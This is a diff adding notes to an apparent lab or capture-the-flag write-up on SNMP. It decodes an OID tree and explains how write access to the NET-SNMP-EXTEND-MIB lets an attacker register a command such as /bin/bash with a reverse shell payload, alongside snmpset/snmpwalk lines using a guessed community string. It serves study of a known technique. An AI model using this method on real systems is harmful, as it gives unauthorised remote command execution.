@@ -69,4 +69,39 @@ snmpset -v2c -c pr1v4t3 10.129.185.152 \
 snmpwalk -v2c -c pr1v4t3 10.129.153.16 1.3.6.1.4.1.8072.1.3.2.4.1.2.3.114.101.118
 ```
 
+.1.3.6.1.2.1.1.5.0 translates into the tree structure:
+
+    .1 = iso (The Root)
+
+    .3 = org (Organizations)
+
+    .6 = dod (Department of Defense)
+
+    .1 = internet
+
+    .2 = mgmt (Management)
+
+    .1 = mib-2 (Standard Network Management)
+
+    .1 = system (The System Info folder)
+
+    .5 = sysName (The specific file that holds the device's hostname)
+
+    .0 = The exact instance of that name.
+    
 ===
+### The Base Path: 1.3.6.1.4.1.8072.1.3.2
+
+**When we realized we had Write access (snmpset), we targeted a very specific branch of the SNMP tree called the NET-SNMP-EXTEND-MIB. This specific branch exists to allow administrators to run custom shell scripts and read their output via SNMP.
+
+    The OID for this specific branch is 1.3.6.1.4.1.8072.1.3.2.
+
+### The "Action" Codes
+
+**Inside that branch, there are specific sub-folders for different actions:
+
+    .2.1.21 (nsExtendStatus): Tells SNMP to create a new script entry or destroy an old one. Setting this to 4 (createAndGo) creates the entry.
+
+    .2.1.2 (nsExtendCommand): Tells SNMP what binary to run (e.g., /bin/bash or /bin/cat).
+
+    .2.1.3 (nsExtendArgs): Tells SNMP the arguments to pass to that binary (e.g., your reverse shell payload).
